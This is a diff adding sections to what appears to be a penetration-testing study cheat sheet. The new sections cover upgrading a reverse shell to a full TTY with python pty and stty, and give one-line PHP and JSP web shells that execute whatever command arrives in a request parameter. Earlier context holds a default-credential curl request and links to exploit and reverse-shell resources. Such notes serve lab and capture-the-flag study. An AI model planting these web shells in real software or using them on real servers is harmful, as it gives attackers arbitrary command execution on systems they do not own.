@@ -80,6 +80,36 @@ $ curl -X POST -u ‘username:admin&password:admin’ http://<SERVER_IP>:<PORT>/
 - ExploitDB
 - Github, [payloadAllTheThings](https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/)
 
+## Shell commands
+
+$ python -c ‘import pty; pty.spawn(“/bin/bash”)’
+
+upgrades shell connection to python/stty shell
+
+CTRL+Z pause session in bash connection
+
+input following stty command
+
+$ stty raw -echo
+
+$ fg
+
+[enter]
+
+## Resize STTY terminal
+
+*in normal terminal:* $ echo $term
+
+*in stty:* $ stty size
+
+## Web Shell
+
+`<?php system($_REQUEST["cmd"]); ?>`
+
+opens web shell running php
+
+same is JSP
+`<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>`
 ## LINKS
 
 ### Common Ports - [Wayback Machine]([https://web.archive.org/web/20240315102711/https://packetlife.net/media/library/23/common-ports.pdf](https://swisskyrepo.github.io/InternalAllTheThings/))
